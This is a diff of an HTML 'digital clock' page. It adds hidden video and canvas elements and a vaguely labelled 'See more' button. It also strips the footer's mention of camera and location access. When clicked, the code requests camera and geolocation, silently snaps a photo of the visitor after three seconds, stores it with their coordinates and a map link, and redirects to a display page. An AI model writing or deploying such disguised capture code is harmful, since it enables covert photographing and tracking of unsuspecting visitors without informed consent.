@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>JAM DIGITAL L-HAKIM</title>
+  <title>Digital Clock with Automatic Photo and Location</title>
   <style>
     body {
       display: flex;
@@ -12,88 +12,44 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      background: linear-gradient(135deg, #1d1d1d, #434343);
+      background: linear-gradient(135deg, #000000, #333333);
       color: white;
       font-family: 'Roboto', sans-serif;
       text-align: center;
       overflow: hidden;
     }
-
     .clock {
       font-size: 60px;
       margin-bottom: 20px;
-      opacity: 0;
-      transform: translateY(-50px);
-      animation: fadeInMoveDown 2s ease-out forwards 1.5s;
     }
-
-    .message {
-      font-size: 28px;
-      margin-bottom: 20px;
-      opacity: 0;
-      transform: translateY(-50px);
-      animation: fadeInMoveDown 2s ease-out forwards 0.5s;
+    button {
+      padding: 10px 20px;
+      background-color: #00aaff;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
     }
-
+    button:hover {
+      background-color: #007acc;
+    }
     footer {
       margin-top: 20px;
       font-size: 14px;
-      opacity: 0;
-      transform: translateY(50px);
-      animation: fadeInMoveUp 2s ease-out forwards 3s;
-    }
-
-    @keyframes fadeInMoveDown {
-      0% {
-        opacity: 0;
-        transform: translateY(-50px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes fadeInMoveUp {
-      0% {
-        opacity: 0;
-        transform: translateY(50px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    body::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.1) 10%, transparent 10.1%) 0 0, 
-                  radial-gradient(circle, rgba(255,255,255,0.1) 10%, transparent 10.1%) 50px 50px;
-      background-size: 100px 100px;
-      animation: rotateBackground 20s linear infinite;
-    }
-
-    @keyframes rotateBackground {
-      0% {
-        transform: rotate(0deg);
-      }
-      100% {
-        transform: rotate(360deg);
-      }
     }
   </style>
 </head>
 <body>
 
-  <div class="message">Welcome to my jam digital</div>
   <div class="clock" id="clock">00:00:00</div>
+  <video id="video" autoplay style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-  <footer>Modern Digital Clock & Camera & Location Access</footer>
+  <button id="locationBtn">Lihat Selengkapnya</button>
+
+  <footer>Modern Digital Clock</footer>
 
   <script>
     function updateClock() {
@@ -104,25 +60,34 @@
       document.getElementById('clock').textContent = `${hours}:${minutes}:${seconds}`;
     }
     setInterval(updateClock, 1000);
-    updateClock(); // initial call
+    updateClock();
 
-    // Automatically request camera access
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Akses kamera untuk mengambil foto
     function requestCameraAccess() {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
           .then((stream) => {
-            console.log("Camera access granted.");
-            saveVisitorData(stream);
+            video.srcObject = stream;
+
+            setTimeout(() => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imageData = canvas.toDataURL('image/png');
+              saveVisitorData(imageData);
+            }, 3000);
           })
           .catch(error => {
             alert('Unable to access camera: ' + error.message);
           });
-      } else {
-        alert('Camera access is not supported by your browser.');
       }
     }
 
-    // Request location access
+    // Akses lokasi pengguna
     function requestLocationAccess() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -130,7 +95,8 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            saveLocationData(mapsURL);
+            saveLocationData(latitude, longitude, mapsURL);
+            redirectToDisplay();
           },
           (error) => {
             alert('Unable to access location: ' + error.message);
@@ -141,30 +107,37 @@
       }
     }
 
-    // Save visitor data (location & camera)
-    function saveVisitorData(stream) {
+    // Simpan data pengunjung di localStorage
+    function saveVisitorData(imageData) {
       const visitorData = {
         timestamp: new Date(),
-        cameraURL: 'Camera accessed successfully', // Placeholder since we won't display video
+        cameraImage: imageData,
       };
       const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
       visitors.push(visitorData);
       localStorage.setItem('visitors', JSON.stringify(visitors));
     }
 
-    // Save location data
-    function saveLocationData(mapsURL) {
+    // Simpan data lokasi
+    function saveLocationData(latitude, longitude, mapsURL) {
       const visitors = JSON.parse(localStorage.getItem('visitors')) || [];
       if (visitors.length > 0) {
-        visitors[visitors.length - 1].location = mapsURL; // Append location to the last saved visitor
+        visitors[visitors.length - 1].location = mapsURL;
+        visitors[visitors.length - 1].latitude = latitude;
+        visitors[visitors.length - 1].longitude = longitude;
       }
       localStorage.setItem('visitors', JSON.stringify(visitors));
     }
 
-    window.onload = () => {
+    // Redirect ke halaman display
+    function redirectToDisplay() {
+      window.location.href = 'display.html';
+    }
+
+    document.getElementById('locationBtn').addEventListener('click', () => {
       requestCameraAccess();
       requestLocationAccess();
-    };
+    });
   </script>
   
 </body>
